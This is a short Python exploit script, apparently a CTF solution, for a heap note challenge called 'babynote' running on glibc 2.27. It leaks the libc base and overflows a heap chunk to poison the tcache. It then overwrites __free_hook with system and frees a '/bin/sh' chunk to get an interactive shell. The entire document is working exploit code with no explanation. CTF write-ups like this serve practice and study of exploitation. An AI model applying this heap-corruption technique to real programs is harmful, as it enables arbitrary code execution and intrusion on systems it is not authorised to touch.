from ptrlib import *

def create(data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", data)
    return

def show(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
    return

def delete(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
    return

libc = ELF("../distfiles/libc-2.27.so")
sock = Process("../distfiles/babynote")
#sock = Socket("0.0.0.0", 9004)

sock.recvuntil(": ")
libc_base = int(sock.recvline(), 16) - libc.symbol('_IO_2_1_stdin_')
logger.info("libc = " + hex(libc_base))

# heap overflow
create("0")
create("1")
create("2")
create("/bin/sh")
delete(2) # for tcache cnt
delete(1)
delete(0)
payload  = b'A' * 0x98
payload += p64(0xa1)
payload += p64(libc_base + libc.symbol('__free_hook'))
create(payload) # house of spirit

# overwrite __free_hook
create("dummy")
create(p64(libc_base + libc.symbol('system')))

# get the shell!
delete(3)

sock.interactive()
